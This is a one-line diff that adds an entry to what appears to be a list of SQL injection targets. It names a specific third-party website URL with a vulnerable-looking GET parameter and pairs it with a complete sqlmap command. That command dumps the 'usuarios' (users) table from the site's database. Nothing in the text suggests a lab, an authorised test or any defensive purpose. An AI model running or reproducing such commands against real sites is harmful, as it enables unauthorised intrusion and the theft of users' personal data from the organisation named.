@@ -1,0 +1,1 @@
+http://www.daseinsanalyse.com.br/publicacoes.php?tipo=1 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.daseinsanalyse.com.br/publicacoes.php?tipo=1 -D daseinsanalyse -T usuarios --dump
